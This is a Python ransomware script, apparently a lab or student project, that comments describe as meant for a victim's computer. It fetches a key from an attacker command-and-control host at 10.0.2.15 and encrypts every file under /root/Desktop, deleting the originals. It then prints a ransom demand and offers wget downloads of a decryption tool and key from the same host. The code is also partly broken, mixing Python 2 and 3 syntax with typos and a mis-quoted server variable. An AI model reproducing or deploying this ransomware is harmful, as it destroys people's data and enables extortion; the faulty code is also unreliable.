# This the malware code that is actually to be run on the victims coputer 
# conver it to the exe before finally executing on the windows based operating system 

#! usr/bin/python
import sys
import os
import time
##os.system("pip install socket && pip install cryptography") # installing the required python libraries ....
import socket
from cryptography.fernet import Fernet
os.system("pip install wget")
import wget 
# Iniatilising the socket server   
master_serverIP = "10.0.2.15"  # The Attacker_server where 
sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)   #  tcp based command and control server controlled by the Attacker/Hacker 
sock.connect(("master_serverIP" , int(sys.argv[1])))

enter = "Running the malware..."
exit = "Data encrytion Started"
print(sock.recv(2048).decode())
key = sock.recv(2048)

print(key)
sock.send(exit.encode())
sock.close()

# Main Encrytion operating function that locks the system files
def encrypt_all(key , name):
 	#if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        # file extension modification after the file encryption completes in the victim's machine 
        encrypted_file = name + ".encrypted"

        try: 
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)
        	# original file removed by the operating system 
            os.remove(name)

        except:
            print("Operation not completed , due to some failure ")


def filelist():
#  declared mylist[] array to find and store all the desired extension files
# that are to be encrypted by the malware 
    
    # files containing array --->> List crypcrrp 
    #mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
    #mylist = [".html"]
    for root, dirs, files in os.walk("/root/Desktop"):
        for file in files:
        	# searching files of extensions given in the list above 
     #       for ext in mylist:    
      #          if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    # calling the function ..//>>
                    encrypt_all(key, ally)

filelist() # Executing the ransomware ...//::))

print                               "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!!!!!!1!!!WARNING!!!!!!!!!!!!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX "
print                                                              "YOU ARE INFECTED WITH THE RAMSOMWARE VIRUS!!!! "

print                                       "XXXXXXXXXXX!!All of your Important Data Have been encrypted!!!XXXXXXXXXXXX"
print " "

print "Pay the ransom to the given link to recover your encrypted data.../"


def start_server():

    print "Starting the hacker's deistribution server ....."
    print " Server Access URL is --->>>> http://10.0.2.15/"
    os.system("service apache2 start")


start_server()


def pay_ransom():
    print "Please select procedure to revert your all infected data"
    print " "

    print "1.) Get decryprtion tool"
    print "2.) Pay Ransom demanded"
    print "3.) Get a private key"

    get = int(input(">>"))

    if get==1:
        print "Downloading the decryprion tool to your present directory......"
        wget.download("http://10.0.2.15/deccipher.py")
        print "Download completed...check your current directory."


    elif get==3:
        password=input("Enter your authentication password to get a key>>")
        if password =="ransom":
            print "Downloading the private key_file..."
            wget.dowmload("http://10.0.2.15/password.key")





pay_ransom()
#  end temporarily ..now ../


    
